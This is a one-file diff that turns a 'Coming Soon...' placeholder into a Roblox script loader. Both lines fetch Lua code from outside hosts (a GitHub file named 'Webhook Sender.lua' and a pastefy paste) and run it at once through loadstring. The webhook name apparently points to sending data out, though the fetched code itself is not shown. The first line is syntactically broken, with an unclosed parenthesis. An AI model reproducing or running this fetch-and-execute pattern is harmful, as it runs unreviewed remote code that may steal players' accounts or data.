@@ -1,1 +1,2 @@
-Coming Soon...
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Rblx.Scripts/refs/heads/main/Webhook%20Sender.lua"))(
+loadstring(game:HttpGet("https://pastefy.app/bUivM5E5/raw"))()
